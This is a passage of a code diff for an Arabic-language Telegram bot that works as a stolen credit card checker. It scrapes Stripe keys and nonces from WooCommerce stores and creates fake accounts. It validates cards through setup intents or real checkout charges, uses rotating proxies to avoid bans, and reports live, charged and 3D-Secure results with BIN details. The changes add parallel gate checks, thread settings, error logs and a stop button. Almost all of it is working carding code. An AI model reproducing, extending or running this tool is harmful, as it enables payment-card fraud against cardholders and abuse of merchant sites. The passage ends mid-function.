@@ -18,6 +18,18 @@ import logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# ================= سجل الأخطاء =================
+error_log = []
+MAX_LOG_SIZE = 50
+
+def log_error(error_type, details):
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    entry = f"[{timestamp}] {error_type}: {details}"
+    error_log.append(entry)
+    if len(error_log) > MAX_LOG_SIZE:
+        error_log.pop(0)
+    logger.error(entry)
+
 # ================= قراءة التوكن ومعرف الأدمن =================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
@@ -32,6 +44,20 @@ try:
 except Exception as e:
     print(f"❌ خطأ في التوكن: {e}")
     sys.exit(1)
+
+# ================= إعدادات الأداء (قابلة للتعديل) =================
+CARD_WORKERS = int(os.environ.get('CARD_WORKERS', '10'))
+PROXY_WORKERS = int(os.environ.get('PROXY_WORKERS', '5'))
+MAX_RETRIES = int(os.environ.get('MAX_RETRIES', '2'))
+
+# ================= مسار البانر =================
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BANNER_PATH = os.path.join(BASE_DIR, 'banner.avif')
+
+if os.path.exists(BANNER_PATH):
+    print(f"✅ تم العثور على البانر: {BANNER_PATH}")
+else:
+    print(f"⚠️ تحذير: البانر غير موجود في {BANNER_PATH}")
 
 # ================= قاعدة البيانات =================
 DB_PATH = os.environ.get('DB_PATH', '/app/data/bot_database.db')
@@ -64,11 +90,36 @@ def init_db():
         status TEXT DEFAULT 'active',
         last_used TEXT
     )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS settings (
+        key TEXT PRIMARY KEY,
+        value TEXT
+    )''')
     conn.commit()
     conn.close()
     print(f"✅ تم تهيئة قاعدة البيانات في: {DB_PATH}")
 
 init_db()
+
+# ================= دوال الإعدادات =================
+def get_setting(key, default=None):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT value FROM settings WHERE key = ?", (key,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else default
+
+def set_setting(key, value):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
+    conn.commit()
+    conn.close()
+
+# تحميل الإعدادات المحفوظة
+saved_workers = get_setting('card_workers')
+if saved_workers:
+    CARD_WORKERS = int(saved_workers)
 
 # ================= دوال الاشتراكات =================
 def is_subscription_active(user_id):
@@ -166,7 +217,6 @@ def get_all_proxies():
     return rows
 
 def get_all_proxies_for_export():
-    """جلب جميع البروكسيات النشطة للتصدير"""
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("SELECT proxy FROM proxies WHERE status = 'active' ORDER BY success_count DESC")
@@ -184,16 +234,9 @@ def update_proxy_success(proxy):
 def update_proxy_failure(proxy):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    
-    # 1. زيادة عداد الفشل
     c.execute("UPDATE proxies SET fail_count = fail_count + 1 WHERE proxy = ?", (proxy,))
-    
-    # 2. عند 3 فشل: تغيير الحالة إلى dead
     c.execute("UPDATE proxies SET status = 'dead' WHERE proxy = ? AND fail_count >= 3", (proxy,))
-    
-    # 3. ✅ عند 5 فشل: حذف البروكسي نهائياً من قاعدة البيانات
     c.execute("DELETE FROM proxies WHERE proxy = ? AND fail_count >= 5", (proxy,))
-    
     conn.commit()
     conn.close()
 
@@ -286,9 +329,7 @@ def check_proxy_accurate(proxy):
             return proxy
     except:
         pass
-    
     time.sleep(0.5)
-    
     try:
         r = requests.get("https://httpbin.org/ip", proxies=proxy_dict, timeout=5)
         if r.status_code == 200:
@@ -298,14 +339,12 @@ def check_proxy_accurate(proxy):
     return None
 
 def add_proxies_to_pool_with_report(proxy_list, chat_id, check=True):
-    """إضافة البروكسيات مع إرسال تقرير للأدمن"""
     working = []
     total = len(proxy_list)
     checked = 0
     
     if check:
-        # فحص البروكسيات
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=PROXY_WORKERS) as executor:
             futures = {executor.submit(check_proxy_accurate, p): p for p in proxy_list}
             for future in as_completed(futures):
                 res = future.result()
@@ -313,7 +352,6 @@ def add_proxies_to_pool_with_report(proxy_list, chat_id, check=True):
                 if res:
                     working.append(res)
                     proxy_pool.add_proxy(res)
-                
                 if checked % 10 == 0 or checked == total:
                     try:
                         progress = int((checked / total) * 100)
@@ -323,12 +361,10 @@ def add_proxies_to_pool_with_report(proxy_list, chat_id, check=True):
                     except:
                         pass
     else:
-        # إضافة مباشرة بدون فحص
         working = proxy_list
         for proxy in proxy_list:
             proxy_pool.add_proxy(proxy)
     
-    # التقرير النهائي
     if check:
         bot.send_message(chat_id, 
             f"✅ **انتهى الفحص**\n\n"
@@ -346,7 +382,6 @@ def add_proxies_to_pool_with_report(proxy_list, chat_id, check=True):
             f"✅ تم الإضافة: {len(working)}\n\n"
             f"⚡ تم الإضافة بدون فحص (سريع)",
             parse_mode="Markdown")
-    
     return working
 
 # ================= البوابات =================
@@ -365,7 +400,10 @@ CHARGE_GATE = {
 
 user_gate_choice = {}
 user_check_type = {}
-user_progress = {}
+
+# ================= تتبع الفحوصات النشطة =================
+active_checks = {}  # user_id -> {'stop_flag': False, 'chat_id': ..., 'msg_id': ...}
+active_checks_lock = threading.Lock()
 
 BILLING_INFO = {
     'first_name': 'Oscar',
@@ -396,11 +434,60 @@ def get_bin_info(bin6):
         pass
     return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🌍"}
 
-# ================= فحص Auth =================
+# ================= دوال البانر =================
+def send_banner_with_progress(chat_id, progress_text, show_stop=True):
+    """إرسال البانر مع progress bar"""
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    if show_stop:
+        markup.add(
+            types.InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"),
+            types.InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")
+        )
+    else:
+        markup.add(
+            types.InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")
+        )
+    
+    try:
+        if os.path.exists(BANNER_PATH):
+            with open(BANNER_PATH, 'rb') as photo:
+                msg = bot.send_photo(chat_id, photo, caption=progress_text, 
+                                    parse_mode="Markdown", reply_markup=markup)
+            return msg.message_id
+        else:
+            msg = bot.send_message(chat_id, progress_text, 
+                                  parse_mode="Markdown", reply_markup=markup)
+            return msg.message_id
+    except Exception as e:
+        log_error("BANNER_SEND_ERROR", str(e))
+        msg = bot.send_message(chat_id, progress_text, 
+                              parse_mode="Markdown", reply_markup=markup)
+        return msg.message_id
+
+def update_banner_progress(chat_id, message_id, progress_text, show_stop=True):
+    """تحديث البانر مع progress bar"""
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    if show_stop:
+        markup.add(
+            types.InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"),
+            types.InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")
+        )
+    else:
+        markup.add(
+            types.InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")
+        )
+    
+    try:
+        bot.edit_message_caption(chat_id, message_id, caption=progress_text, 
+                                parse_mode="Markdown", reply_markup=markup)
+    except Exception as e:
+        pass
+
+# ================= فحص Auth (متوازي) =================
 def check_card_auth_single(card_str, site_url, proxy=None):
     parts = card_str.split('|')
     if len(parts) != 4:
-        return "INVALID_FORMAT"
+        return "INVALID_FORMAT", None, None
     cc, month, year, cvv = parts
     if len(year) == 2:
         year = "20" + year
@@ -414,7 +501,8 @@ def check_card_auth_single(card_str, site_url, proxy=None):
         resp = session.get(f"{site_url}/my-account/", headers=headers, proxies=proxy_dict, timeout=15)
         reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
         if not reg_nonce:
-            return "FAILED_NONCE"
+            log_error("FAILED_NONCE", f"Site: {site_url}, Proxy: {proxy}")
+            return "FAILED_NONCE", site_url, proxy
         reg_nonce = reg_nonce.group(1)
 
         email = f"{random.randint(100000,999999)}@temp.com"
@@ -429,7 +517,8 @@ def check_card_auth_single(card_str, site_url, proxy=None):
         pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', resp.text)
         nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', resp.text)
         if not pk_match or not nonce_match:
-            return "FAILED_STRIPE_EXTRACT"
+            log_error("FAILED_STRIPE_EXTRACT", f"Site: {site_url}, Proxy: {proxy}")
+            return "FAILED_STRIPE_EXTRACT", site_url, proxy
         
         stripe_pk = pk_match.group(0)
         setup_nonce = nonce_match.group(1)
@@ -444,7 +533,9 @@ def check_card_auth_single(card_str, site_url, proxy=None):
                           proxies=proxy_dict, timeout=15)
         pm_id = resp.json().get('id')
         if not pm_id:
-            return "DECLINED"
+            error_msg = resp.json().get('error', {}).get('message', 'Unknown')
+            log_error("STRIPE_DECLINED", f"Error: {error_msg[:50]}, Proxy: {proxy}")
+            return "DECLINED", site_url, proxy
 
         ajax_data = {
             'action': 'wc_stripe_create_and_confirm_setup_intent',
@@ -457,42 +548,58 @@ def check_card_auth_single(card_str, site_url, proxy=None):
         result = resp.json()
         
         if result.get('success'):
-            return "PASSED"
+            return "PASSED", site_url, proxy
         else:
             error_msg = result.get('data', {}).get('error', {}).get('message', '')
             if 'otp' in error_msg.lower() or '3d' in error_msg.lower():
-                return "OTP"
-            return "DECLINED"
+                return "OTP", site_url, proxy
+            log_error("AUTH_DECLINED", f"Error: {error_msg[:50]}, Proxy: {proxy}")
+            return "DECLINED", site_url, proxy
     except Exception as e:
-        return f"ERROR"
+        log_error("AUTH_ERROR", f"Error: {str(e)[:50]}, Proxy: {proxy}")
+        return "ERROR", site_url, proxy
 
 def check_card_auth_with_retry(card_str, site_url):
     for attempt in range(proxy_pool.max_retries):
         proxy = proxy_pool.get_proxy()
-        status = check_card_auth_single(card_str, site_url, proxy)
+        status, used_site, used_proxy = check_card_auth_single(card_str, site_url, proxy)
         if status in ("PASSED", "OTP"):
             if proxy:
                 proxy_pool.report_success(proxy)
-            return status
+            return status, used_site, used_proxy
         else:
             if proxy:
                 proxy_pool.report_failure(proxy)
             if attempt < proxy_pool.max_retries - 1:
                 time.sleep(proxy_pool.backoff_factor * (2 ** attempt))
-    return "DECLINED"
+    return "DECLINED", site_url, None
 
-def check_card_multi_auth(card_str):
+def check_card_multi_auth_parallel(card_str):
+    """فحص 3 بوابات في نفس الوقت (متوازي)"""
     results = []
-    gates_order = ['1', '2', '3']
     
-    for gate_id in gates_order:
-        site_url = AUTH_GATES[gate_id]['site']
-        gate_name = AUTH_GATES[gate_id]['name']
-        status = check_card_auth_with_retry(card_str, site_url)
-        results.append({'gate': gate_name, 'status': status})
+    with ThreadPoolExecutor(max_workers=3) as executor:
+        futures = {}
+        for gate_id in ['1', '2', '3']:
+            site_url = AUTH_GATES[gate_id]['site']
+            futures[executor.submit(check_card_auth_with_retry, card_str, site_url)] = gate_id
         
-        if status == "DECLINED":
-            break
+        for future in as_completed(futures):
+            gate_id = futures[future]
+            try:
+                status, used_site, used_proxy = future.result()
+                results.append({
+                    'gate': AUTH_GATES[gate_id]['name'],
+                    'status': status,
+                    'proxy': used_proxy or 'No Proxy'
+                })
+            except Exception as e:
+                log_error("GATE_ERROR", f"Gate {gate_id}: {str(e)[:50]}")
+                results.append({
+                    'gate': AUTH_GATES[gate_id]['name'],
+                    'status': 'ERROR',
+                    'proxy': 'No Proxy'
+                })
     
     passed_count = sum(1 for r in results if r['status'] == "PASSED")
     otp_count = sum(1 for r in results if r['status'] == "OTP")
@@ -519,7 +626,7 @@ def check_card_multi_auth(card_str):
 def check_card_charge(card_str, proxy=None):
     parts = card_str.split('|')
     if len(parts) != 4:
-        return "INVALID_FORMAT", None
+        return "INVALID_FORMAT", None, None, None
     cc, month, year, cvv = parts
     if len(year) == 2:
         year = "20" + year
@@ -552,7 +659,8 @@ def check_card_charge(card_str, proxy=None):
             nonce_match = re.search(r'"nonce":"([^"]+)"', checkout_html)
         
         if not pk_match or not nonce_match:
-            return "FAILED_EXTRACT", None
+            log_error("CHARGE_EXTRACT_FAIL", f"Proxy: {proxy}")
+            return "FAILED_EXTRACT", None, site_url, proxy
         
         stripe_pk = pk_match.group(0) if pk_match.group(0).startswith('pk_') else pk_match.group(1)
         checkout_nonce = nonce_match.group(1)
@@ -590,9 +698,11 @@ def check_card_charge(card_str, proxy=None):
         
         if not pm_id:
             error = pm_data.get('error', {})
+            error_msg = error.get('message', '')
             if 'otp' in str(error).lower() or '3d' in str(error).lower():
-                return "OTP", None
-            return "DECLINED", None
+                return "OTP", None, site_url, proxy
+            log_error("CHARGE_STRIPE_DECLINE", f"Error: {error_msg[:50]}, Proxy: {proxy}")
+            return "DECLINED", None, site_url, proxy
         
         checkout_data = {
             'billing_first_name': BILLING_INFO['first_name'],
@@ -630,61 +740,62 @@ def check_card_charge(card_str, proxy=None):
         result = resp.json()
         
         if result.get('result') == 'success':
-            return "CHARGED", result.get('redirect')
+            return "CHARGED", result.get('redirect'), site_url, proxy
         else:
             messages = result.get('messages', '')
             if 'otp' in str(messages).lower() or '3d' in str(messages).lower():
-                return "OTP", None
-            return "DECLINED", None
+                return "OTP", None, site_url, proxy
+            log_error("CHARGE_DECLINED", f"Messages: {str(messages)[:50]}, Proxy: {proxy}")
+            return "DECLINED", None, site_url, proxy
             
     except Exception as e:
-        return f"ERROR: {str(e)[:50]}", None
+        log_error("CHARGE_ERROR", f"Error: {str(e)[:50]}, Proxy: {proxy}")
+        return "ERROR", None, CHARGE_GATE['site'], proxy
 
 def check_card_charge_with_retry(card_str):
     for attempt in range(proxy_pool.max_retries):
         proxy = proxy_pool.get_proxy()
-        status, redirect = check_card_charge(card_str, proxy)
+        status, redirect, used_site, used_proxy = check_card_charge(card_str, proxy)
         if status in ("CHARGED", "OTP"):
             if proxy:
                 proxy_pool.report_success(proxy)
-            return status, redirect
+            return status, redirect, used_site, used_proxy
         else:
             if proxy:
                 proxy_pool.report_failure(proxy)
             if attempt < proxy_pool.max_retries - 1:
                 time.sleep(proxy_pool.backoff_factor * (2 ** attempt))
-    return "DECLINED", None
+    return "DECLINED", None, CHARGE_GATE['site'], None
 
 # ================= معالجة البطاقات =================
-def update_progress_message(chat_id, message_id, current, total, check_type):
-    try:
-        progress = int((current / total) * 100)
-        bar_length = 20
-        filled = int(bar_length * current / total)
-        bar = '█' * filled + '░' * (bar_length - filled)
-        
-        check_name = "Auth" if check_type == 'auth' else "Charge"
-        
-        progress_text = f"""⏳ **جاري الفحص...**
-
-📊 **التقدم:** {current}/{total} ({progress}%)
-{bar}
-
-⚡ **النوع:** {check_name}
-🔄 **الحالة:** يعمل الآن..."""
-        
-        bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
-    except:
-        pass
-
-def process_single_card_auth(card, idx, total, chat_id, progress_msg_id):
-    final_status, emoji, results = check_card_multi_auth(card)
+class ProgressTracker:
+    def __init__(self, total):
+        self.total = total
+        self.current = 0
+        self.lock = threading.Lock()
     
-    update_progress_message(chat_id, progress_msg_id, idx, total, 'auth')
+    def increment(self):
+        with self.lock:
+            self.current += 1
+            return self.current
+
+def process_single_card_auth(card, chat_id, user_id, stats, stats_lock):
+    # التحقق من إشارة الإيقاف
+    with active_checks_lock:
+        if user_id in active_checks and active_checks[user_id]['stop_flag']:
+            return "STOPPED"
     
-    if final_status == "💀 DEAD":
-        return final_status
+    final_status, emoji, results = check_card_multi_auth_parallel(card)
     
+    with stats_lock:
+        if 'SUPER LIVE' in final_status or 'LIVE' in final_status:
+            stats['passed'] += 1
+        elif '3D SECURE' in final_status:
+            stats['otp'] += 1
+        else:
+            stats['failed'] += 1
+    
+    # إرسال النتيجة (بدون بانر)
     bin6 = card.split('|')[0][:6]
     bin_info = get_bin_info(bin6)
     
@@ -695,11 +806,17 @@ def process_single_card_auth(card, idx, total, chat_id, progress_msg_id):
 """
     for r in results:
         if r['status'] == "PASSED":
-            msg += f"✅ {r['gate']}: PASSED\n"
+            msg += f"✅ {r['gate']}: PASSED\n   🔌 Proxy: `{r['proxy']}`\n"
         elif r['status'] == "OTP":
-            msg += f"⚠️ {r['gate']}: OTP\n"
+            msg += f"⚠️ {r['gate']}: OTP\n   🔌 Proxy: `{r['proxy']}`\n"
+        elif r['status'] == "FAILED_NONCE":
+            msg += f"❌ {r['gate']}: فشل استخراج Nonce\n   🔌 Proxy: `{r['proxy']}`\n"
+        elif r['status'] == "FAILED_STRIPE_EXTRACT":
+            msg += f"❌ {r['gate']}: فشل استخراج Stripe\n   🔌 Proxy: `{r['proxy']}`\n"
+        elif r['status'] == "ERROR":
+            msg += f"❌ {r['gate']}: خطأ في الاتصال\n   🔌 Proxy: `{r['proxy']}`\n"
         else:
-            msg += f"❌ {r['gate']}: DECLINED\n"
+            msg += f"❌ {r['gate']}: DECLINED\n   🔌 Proxy: `{r['proxy']}`\n"
     
     msg += f"""
 **BIN:** {bin6} | **Brand:** {bin_info['brand']}
@@ -709,16 +826,27 @@ def process_single_card_auth(card, idx, total, chat_id, progress_msg_id):
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
 ╚════════════════════╝"""
     
-    bot.send_message(chat_id, msg, parse_mode="Markdown")
+    try:
+        bot.send_message(chat_id, msg, parse_mode="Markdown")
+    except Exception as e:
+        log_error("SEND_CARD_ERROR", str(e))
+    
     return final_status
 
-def process_single_card_charge(card, idx, total, chat_id, progress_msg_id):
-    status, redirect = check_card_charge_with_retry(card)
+def process_single_card_charge(card, chat_id, user_id, stats, stats_lock):
+    with active_checks_lock:
+        if user_id in active_checks and active_checks[user_id]['stop_flag']:
+            return "STOPPED"
     
-    update_progress_message(chat_id, progress_msg_id, idx, total, 'charge')
+    status, redirect, used_site, used_proxy = check_card_charge_with_retry(card)
     
-    if status == "DECLINED":
-        return status
+    with stats_lock:
+        if status == "CHARGED":
+            stats['charged'] += 1
+        elif status == "OTP":
+            stats['otp'] += 1
+        else:
+            stats['failed'] += 1
     
     bin6 = card.split('|')[0][:6]
     bin_info = get_bin_info(bin6)
@@ -729,12 +857,20 @@ def process_single_card_charge(card, idx, total, chat_id, progress_msg_id):
     elif status == "OTP":
         emoji, result_text = "⚠️", "OTP REQUIRED"
         extra = ""
+    elif status == "FAILED_EXTRACT":
+        emoji, result_text = "❌", "فشل استخراج البيانات"
+        extra = ""
+    elif status == "ERROR":
+        emoji, result_text = "❌", "خطأ في الاتصال"
+        extra = ""
     else:
         emoji, result_text = "❌", "DECLINED"
         extra = ""
     
     msg = f"""{emoji} **{result_text}** | {CHARGE_GATE['name']}
 `{card}`{extra}
+
+🔌 **Proxy:** `{used_proxy or 'No Proxy'}`
 
 **BIN:** {bin6} | **Brand:** {bin_info['brand']}
 **Type:** {bin_info['type']} | **Bank:** {bin_info['bank']}
@@ -743,78 +879,138 @@ def process_single_card_charge(card, idx, total, chat_id, progress_msg_id):
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
 ╚════════════════════╝"""
     
-    bot.send_message(chat_id, msg, parse_mode="Markdown")
+    try:
+        bot.send_message(chat_id, msg, parse_mode="Markdown")
+    except Exception as e:
+        log_error("SEND_CARD_ERROR", str(e))
+    
     return status
 
-def check_cards(cards_text, chat_id, message_id, check_type):
+def check_cards(cards_text, chat_id, user_id, check_type):
     cards = [c.strip() for c in cards_text.splitlines() if "|" in c and len(c.split('|')) == 4]
     if not cards:
-        bot.edit_message_text("❌ لم يتم العثور على بطاقات صالحة. الصيغة: رقم|شهر|سنة|cvv", chat_id, message_id)
+        bot.send_message(chat_id, "❌ لم يتم العثور على بطاقات صالحة.")
         return
     
     total = len(cards)
-    
     check_name = "Auth" if check_type == 'auth' else "Charge"
+    
+    # إعداد تتبع الفحص
+    with active_checks_lock:
+        active_checks[user_id] = {'stop_flag': False, 'chat_id': chat_id}
+    
+    progress_tracker = ProgressTracker(total)
+    stats = {'passed': 0, 'otp': 0, 'failed': 0, 'charged': 0}
+    stats_lock = threading.Lock()
+    
+    # إرسال البانر الأولي
     progress_text = f"""⏳ **جاري الفحص...**
 
 📊 **التقدم:** 0/{total} (0%)
 {'░' * 20}
 
 ⚡ **النوع:** {check_name}
-🔄 **الحالة:** يعمل الآن..."""
+✅ **ناجح:** 0
+⚠️ **OTP:** 0
+❌ **فشل:** 0
+🔄 **الحالة:** يبدأ الآن..."""
     
-    bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
+    banner_msg_id = send_banner_with_progress(chat_id, progress_text, show_stop=True)
     
-    passed = otp = declined = charged = 0
-    
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        if check_type == 'auth':
-            futures = {executor.submit(process_single_card_auth, card, idx, total, chat_id, message_id): card 
-                      for idx, card in enumerate(cards, 1)}
-        else:
-            futures = {executor.submit(process_single_card_charge, card, idx, total, chat_id, message_id): card 
-                      for idx, card in enumerate(cards, 1)}
+    # دالة لتحديث البانر
+    def update_banner():
+        with stats_lock:
+            current = progress_tracker.current
+            current_stats = stats.copy()
         
-        for future in as_completed(futures):
-            try:
-                status = future.result()
-                if check_type == 'auth':
-                    if 'SUPER LIVE' in status or 'LIVE' in status:
-                        passed += 1
-                    elif '3D SECURE' in status:
-                        otp += 1
-                    else:
-                        declined += 1
-                else:
-                    if status == "CHARGED":
-                        charged += 1
-                    elif status == "OTP":
-                        otp += 1
-                    else:
-                        declined += 1
-            except:
-                declined += 1
-    
-    if check_type == 'auth':
-        summary = f"""🏁 **انتهى الفحص**
+        progress = int((current / total) * 100)
+        bar_length = 20
+        filled = int(bar_length * current / total)
+        bar = '█' * filled + '░' * (bar_length - filled)
+        
+        progress_text = f"""⏳ **جاري الفحص...**
 
-✅ LIVE/SUPER: {passed}
-⚠️ 3D SECURE: {otp}
-❌ DECLINED: {declined}
+📊 **التقدم:** {current}/{total} ({progress}%)
+{bar}
+
+⚡ **النوع:** {check_name}
+✅ **ناجح:** {current_stats['passed']}
+⚠️ **OTP:** {current_stats['otp']}
+❌ **فشل:** {current_stats['failed']}
+🔄 **الحالة:** يعمل الآن..."""
+        
+        update_banner_progress(chat_id, banner_msg_id, progress_text, show_stop=True)
+    
+    # بدء الفحص
+    try:
+        with ThreadPoolExecutor(max_workers=CARD_WORKERS) as executor:
+            if check_type == 'auth':
+                futures = [executor.submit(
+                    process_single_card_auth, 
+                    card, chat_id, user_id, stats, stats_lock
+                ) for card in cards]
+            else:
+                futures = [executor.submit(
+                    process_single_card_charge, 
+                    card, chat_id, user_id, stats, stats_lock
+                ) for card in cards]
+            
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                    progress_tracker.increment()
+                    update_banner()
+                except Exception as e:
+                    log_error("CARD_PROCESS_ERROR", str(e))
+                    progress_tracker.increment()
+                    update_banner()
+    except Exception as e:
+        log_error("CHECK_CARDS_ERROR", str(e))
+    
+    # التحقق من الإيقاف
+    was_stopped = False
+    with active_checks_lock:
+        if user_id in active_checks and active_checks[user_id]['stop_flag']:
+            was_stopped = True
+        if user_id in active_checks:
+            del active_checks[user_id]
+    
+    # الملخص النهائي مع البانر
+    if check_type == 'auth':
+        summary = f"""🏁 **انتهى الفحص** {'(تم الإيقاف)' if was_stopped else ''}
+
+✅ LIVE/SUPER: {stats['passed']}
+⚠️ 3D SECURE: {stats['otp']}
+❌ DECLINED: {stats['failed']}
+📊 **الإجمالي:** {progress_tracker.current}/{total}
 ╔════════════════════╗
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
 ╚════════════════════╝"""
     else:
-        summary = f"""🏁 **انتهى الفحص**
+        summary = f"""🏁 **انتهى الفحص** {'(تم الإيقاف)' if was_stopped else ''}
 
-💰 CHARGED: {charged}
-⚠️ OTP: {otp}
-❌ DECLINED: {declined}
+💰 CHARGED: {stats['charged']}
+⚠️ OTP: {stats['otp']}
+❌ DECLINED: {stats['failed']}
+📊 **الإجمالي:** {progress_tracker.current}/{total}
 ╔════════════════════╗
 ║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
 ╚════════════════════╝"""
     
-    bot.send_message(chat_id, summary, parse_mode="Markdown")
+    # إرسال الملخص مع البانر
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(types.InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu"))
+    
+    try:
+        if os.path.exists(BANNER_PATH):
+            with open(BANNER_PATH, 'rb') as photo:
+                bot.send_photo(chat_id, photo, caption=summary, 
+                              parse_mode="Markdown", reply_markup=markup)
+        else:
+            bot.send_message(chat_id, summary, parse_mode="Markdown", reply_markup=markup)
+    except Exception as e:
+        log_error("SUMMARY_ERROR", str(e))
+        bot.send_message(chat_id, summary, parse_mode="Markdown", reply_markup=markup)
 
 # ================= لوحة الإدارة =================
 admin_session = {}
@@ -851,6 +1047,8 @@ def show_admin_menu(user_id):
         types.InlineKeyboardButton("⚡ إضافة سريعة", callback_data="admin_add_proxies_fast"),
         types.InlineKeyboardButton("📤 تصدير بروكسيات", callback_data="admin_export_proxies"),
         types.InlineKeyboardButton("📊 حالة البروكسيات", callback_data="admin_proxy_stats"),
+        types.InlineKeyboardButton("⚙️ إعدادات الفحص", callback_data="admin_check_settings"),
+        types.InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_view_logs"),
         types.InlineKeyboardButton("❌ خروج", callback_data="admin_logout")
     )
     bot.send_message(user_id, "🛠️ **لوحة الإدارة**", reply_markup=markup, parse_mode="Markdown")
@@ -903,21 +1101,13 @@ def admin_callback(call):
     elif data == "admin_add_proxies":
         bot.answer_callback_query(call.id)
         msg = "📡 **إضافة بروكسيات (مع فحص)**\n\n"
-        msg += "أرسل البروكسيات بأي من الطرق:\n\n"
-        msg += "1️⃣ **ملف** (.txt) يحتوي على البروكسيات\n"
-        msg += "2️⃣ **نص** مباشر بالشكل:\n"
-        msg += "`ip:port`\n"
-        msg += "`ip:port`\n\n"
-        msg += "⚠️ البروكسيات ستُفحص تلقائياً"
+        msg += "أرسل البروكسيات (ملف أو نص)"
         bot.send_message(user_id, msg, parse_mode="Markdown")
         admin_session[user_id] = 'awaiting_proxies'
     elif data == "admin_add_proxies_fast":
         bot.answer_callback_query(call.id)
         msg = "⚡ **إضافة سريعة (بدون فحص)**\n\n"
-        msg += "أرسل البروكسيات مباشرة:\n\n"
-        msg += "1️⃣ **ملف** (.txt)\n"
-        msg += "2️⃣ **نص** مباشر\n\n"
-        msg += "⚡ ستُضاف فوراً بدون فحص (سريع)"
+        msg += "أرسل البروكسيات مباشرة"
         bot.send_message(user_id, msg, parse_mode="Markdown")
         admin_session[user_id] = 'awaiting_proxies_fast'
     elif data == "admin_export_proxies":
@@ -927,42 +1117,98 @@ def admin_callback(call):
             bot.send_message(user_id, "📭 لا توجد بروكسيات نشطة")
             return
         
-        # إنشاء ملف
         filename = f"proxies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         with open(filename, 'w') as f:
             f.write('\n'.join(proxies))
         
-        # إرسال الملف
         with open(filename, 'rb') as f:
             bot.send_document(user_id, f, 
                 caption=f"📤 **البروكسيات النشطة**\n\n📊 العدد: {len(proxies)}",
                 parse_mode="Markdown")
         
-        # حذف الملف المؤقت
         os.remove(filename)
         
     elif data == "admin_proxy_stats":
         bot.answer_callback_query(call.id)
         active, banned, dead = proxy_pool.get_stats()
         bot.send_message(user_id, f"📊 **البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")
+    
+    elif data == "admin_check_settings":
+        bot.answer_callback_query(call.id)
+        show_check_settings(user_id)
+    
+    elif data == "admin_view_logs":
+        bot.answer_callback_query(call.id)
+        if not error_log:
+            bot.send_message(user_id, "📭 لا توجد أخطاء مسجلة")
+            return
+        msg = "📜 **آخر الأخطاء:**\n\n"
+        for entry in error_log[-20:]:
+            msg += f"`{entry}`\n\n"
+        bot.send_message(user_id, msg, parse_mode="Markdown")
+    
     elif data == "admin_logout":
         admin_session.pop(user_id, None)
         bot.answer_callback_query(call.id, "تم الخروج")
         bot.send_message(user_id, "👋 تم تسجيل الخروج.")
+    
+    # إعدادات عدد الـ threads
+    elif data.startswith("set_workers_"):
+        bot.answer_callback_query(call.id)
+        workers = int(data.split("_")[2])
+        global CARD_WORKERS
+        CARD_WORKERS = workers
+        set_setting('card_workers', workers)
+        bot.send_message(user_id, f"✅ تم تغيير عدد الـ threads إلى: **{workers}**", parse_mode="Markdown")
+        show_check_settings(user_id)
+
+def show_check_settings(user_id):
+    """عرض إعدادات الفحص"""
+    markup = types.InlineKeyboardMarkup(row_width=3)
+    markup.add(
+        types.InlineKeyboardButton("5", callback_data="set_workers_5"),
+        types.InlineKeyboardButton("10", callback_data="set_workers_10"),
+        types.InlineKeyboardButton("15", callback_data="set_workers_15"),
+        types.InlineKeyboardButton("20", callback_data="set_workers_20"),
+        types.InlineKeyboardButton("25", callback_data="set_workers_25"),
+        types.InlineKeyboardButton("30", callback_data="set_workers_30")
+    )
+    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="admin_back_menu"))
+    
+    msg = f"""⚙️ **إعدادات الفحص**
+
+🔢 **عدد الـ threads الحالي:** `{CARD_WORKERS}`
+
+💡 **التوصيات:**
